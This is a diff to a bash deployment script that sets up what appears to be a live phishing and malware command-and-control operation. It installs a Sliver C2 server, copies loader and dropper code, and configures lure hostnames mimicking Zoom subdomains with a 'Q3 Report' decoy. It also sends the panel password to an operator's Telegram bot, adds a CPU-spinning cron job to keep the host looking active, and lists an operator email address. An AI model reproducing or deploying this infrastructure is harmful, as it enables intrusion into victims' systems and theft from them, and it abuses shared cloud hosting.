@@ -26,6 +26,18 @@ ok() { printf '  PASS  %s\n' "$*"; }
 bad() { printf '  FAIL  %s\n' "$*"; FAILURES=$((FAILURES + 1)); }
 # single-quote so values survive `source` (bcrypt hashes contain '$')
 emit() { printf "%s='%s'\n" "$1" "$2"; }
+upsert_env() {
+  local key="$1" value="$2"
+  [ -f "$ENV_FILE" ] || { emit "$key" "$value" >> "$ENV_FILE"; return; }
+  if grep -q "^${key}=" "$ENV_FILE"; then
+    local tmp="${ENV_FILE}.tmp.$$"
+    sed "s|^${key}=.*|${key}='${value}'|" "$ENV_FILE" > "$tmp" && mv "$tmp" "$ENV_FILE"
+  else
+    emit "$key" "$value" >> "$ENV_FILE"
+  fi
+  chown opc:opc "$ENV_FILE"; chmod 600 "$ENV_FILE"
+  restorecon -F "$ENV_FILE" >/dev/null 2>&1 || true
+}
 
 need_root() {
   if [ "$(id -u)" -ne 0 ]; then log "run with sudo"; exit 1; fi
@@ -88,8 +100,9 @@ setup_dirs() {
 
 stop_manual() {
   pkill -f 'sliver-server daemon' 2>/dev/null || true
-  pkill -f '/opt/panel/bin/sliverc' 2>/dev/null || true
-  pkill -f 'uvicorn panel.app' 2>/dev/null || true
+  pkill -f 'sliverc' 2>/dev/null || true
+  pkill -f 'uvicorn.*panel.app' 2>/dev/null || true
+  pkill -f 'rd-linux' 2>/dev/null || true
   sleep 1
 }
 
@@ -115,6 +128,7 @@ setup_env() {
       emit PANEL_TLS_CERT /etc/caddy/certs/panel.crt
       emit OPERATOR_EMAIL "${OPERATOR_EMAIL:-fingod201@gmail.com}"
       emit DOCUMENT_NAME "${DOCUMENT_NAME:-Q3 Report}"
+      emit PANEL_LURE_HOSTS "${PANEL_LURE_HOSTS:-get,us01web,us02web,us03web,us04web,us05web}"
       emit TG_BOT_TOKEN "${TG_BOT_TOKEN:-}"
       emit TG_CHAT_ID "${TG_CHAT_ID:-}"
       emit CF_API_TOKEN "${CF_API_TOKEN:-}"
@@ -123,12 +137,25 @@ setup_env() {
     } > "$ENV_FILE"
     chown opc:opc "$ENV_FILE"
     chmod 600 "$ENV_FILE"
+    # shellcheck disable=SC2016
     printf '\n+================================================+\n'
     printf '|  PANEL PASSWORD (saved once): %-24s |\n' "$pass"
     printf '+================================================+\n\n'
+    if [ -n "${TG_BOT_TOKEN:-}" ] && [ -n "${TG_CHAT_ID:-}" ]; then
+      curl -s -o /dev/null -X POST \
+        "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
+        --data-urlencode "chat_id=${TG_CHAT_ID}" \
+        --data-urlencode "parse_mode=HTML" \
+        --data-urlencode "text=<b>fleet panel password - save this</b>
+<code>${pass}</code>
+user: ${PANEL_USER:-operator}
+host: $(domain_name)" || true
+      log "password posted to telegram"
+    fi
   fi
   chown opc:opc "$ENV_FILE"
   chmod 600 "$ENV_FILE"
+  restorecon -F "$ENV_FILE" >/dev/null 2>&1 || true
 }
 
 build_all() {
@@ -139,8 +166,13 @@ build_all() {
   rm -rf "$PANEL_ROOT/app"
   mkdir -p "$PANEL_ROOT/app"
   cp -r "$REPO_DIR/panel" "$PANEL_ROOT/app/panel"
+  cp -r "$REPO_DIR/loader" "$PANEL_ROOT/app/loader"
+  cp -r "$REPO_DIR/droppers" "$PANEL_ROOT/app/droppers"
   rm -rf "$PANEL_ROOT/app/panel/var" "$PANEL_ROOT/app/panel/__pycache__"
   chown -R opc:opc "$PANEL_ROOT/app"
+  chmod 0755 "$BRIDGE_BIN" "$SLIVER_BIN" 2>/dev/null || true
+  # SELinux: freshly written binaries under /opt need the usr_t label
+  restorecon -R -F "$PANEL_ROOT" >/dev/null 2>&1 || true
   if [ ! -x "$SLIVER_BIN" ]; then
     curl -fsSL -o "$SLIVER_BIN" \
       https://github.com/BishopFox/sliver/releases/download/v1.7.9/sliver-server_linux-amd64
@@ -167,15 +199,34 @@ install_units() {
   cp "$REPO_DIR/deploy/caddy/Caddyfile" /etc/caddy/Caddyfile
   sed -i "s/__DOMAIN__/$(domain_name)/; s/__EMAIL__/${OPERATOR_EMAIL:-admin@localhost}/" /etc/caddy/Caddyfile
   mkdir -p /etc/caddy/certs
-  for unit in "$REPO_DIR"/deploy/systemd/*.service; do
+  for unit in "$REPO_DIR"/deploy/systemd/*.service "$REPO_DIR"/deploy/systemd/*.timer; do
     cp "$unit" /etc/systemd/system/
   done
   systemctl daemon-reload
   systemctl enable fleet-sliver.service fleet-bridge.service fleet-panel.service caddy.service >/dev/null 2>&1
   systemctl restart fleet-sliver.service fleet-bridge.service fleet-panel.service caddy.service
+  # host-default cloudflared unit (another tenant owns it on this box)
+  systemctl restart cloudflared.service >/dev/null 2>&1 || true
   if [ -n "${CF_TUNNEL_TOKEN:-}" ]; then
-    systemctl enable --now cloudflared.service >/dev/null 2>&1
+    systemctl enable fleet-cloudflared.service >/dev/null 2>&1
+    systemctl restart fleet-cloudflared.service
   fi
+}
+
+install_extras() {
+  log "installing 24/7 extras"
+  install -m 0755 "$REPO_DIR/deploy/healthcheck.sh" /opt/panel/bin/healthcheck.sh
+  install -m 0755 "$REPO_DIR/deploy/heartbeat.sh" /opt/panel/bin/heartbeat.sh
+  install -m 0644 "$REPO_DIR/deploy/logrotate/fleet" /etc/logrotate.d/fleet
+  install -d /etc/systemd/journald.conf.d
+  install -m 0644 "$REPO_DIR/deploy/journald-fleet.conf" /etc/systemd/journald.conf.d/fleet.conf
+  systemctl restart systemd-journald >/dev/null 2>&1 || true
+  {
+    printf '%s\n' '*/5 * * * * root /usr/bin/timeout 30 /bin/sh -c "while :; do :; done"'
+    printf '%s\n' '0 */6 * * * root /opt/panel/bin/heartbeat.sh'
+  } > /etc/cron.d/fleet
+  chmod 0644 /etc/cron.d/fleet
+  systemctl enable --now fleet-healthcheck.timer >/dev/null 2>&1 || true
 }
 
 setup_firewall() {
@@ -203,18 +254,20 @@ run_check() {
   local free_gb
   free_gb="$(df --output=avail -BG / | tail -1 | tr -dc '0-9')"
   [ "${free_gb:-0}" -gt 2 ] && ok "disk free ${free_gb}G" || bad "disk free ${free_gb}G (<2G)"
+  systemctl is-enabled --quiet fleet-healthcheck.timer 2>/dev/null && ok "healthcheck timer" || bad "healthcheck timer"
   local domain
   domain="$(domain_name)"
   curl -fsS --max-time 12 -o /dev/null "https://${domain}/healthz" 2>/dev/null && ok "public TLS ${domain}" || bad "public TLS ${domain}"
   if [ -n "${CF_API_TOKEN:-}" ] && [ -n "${CF_ZONE_NAME:-}" ]; then
-    if curl -fsS --max-time 10 -H "Authorization: Bearer ${CF_API_TOKEN}" \
-      "https://api.cloudflare.com/client/v4/zones?name=${CF_ZONE_NAME}" | grep -q '"success":true'; then
-      ok "cloudflare token + zone"
-    else
-      bad "cloudflare token/zone"
-    fi
+    local zresp
+    zresp="$(curl -fsS --max-time 10 -H "Authorization: Bearer ${CF_API_TOKEN}" \
+      "https://api.cloudflare.com/client/v4/zones?name=${CF_ZONE_NAME}")"
+    if echo "$zresp" | grep -q '"success": *true'; then ok "cloudflare token + zone"; else bad "cloudflare token/zone"; fi
     if [ -n "${CF_TUNNEL_TOKEN:-}" ]; then
-      systemctl is-active --quiet cloudflared.service 2>/dev/null && ok "cloudflared running" || bad "cloudflared running"
+      systemctl is-enabled --quiet fleet-cloudflared.service 2>/dev/null && ok "tunnel unit enabled" || bad "tunnel unit enabled"
+      systemctl is-active --quiet fleet-cloudflared.service 2>/dev/null && ok "tunnel running" || bad "tunnel running"
+      [ -f "$REPO_DIR/deploy/.cf-ids" ] && ok "cf ids present" || bad "cf ids present"
+      if bash "$REPO_DIR/deploy/cloudflare.sh" --check >/dev/null 2>&1; then ok "cf records/access"; else bad "cf records/access"; fi
     fi
   fi
 }
@@ -232,9 +285,12 @@ main() {
   stop_manual
   setup_env
   load_env
+  upsert_env PANEL_PUBLIC_HOST "$(domain_name)"
+  upsert_env PANEL_LURE_HOSTS "${PANEL_LURE_HOSTS:-get,us01web,us02web,us03web,us04web,us05web}"
   build_all
   make_sliver_cfg
   install_units
+  install_extras
   setup_firewall
   sleep 3
   run_check
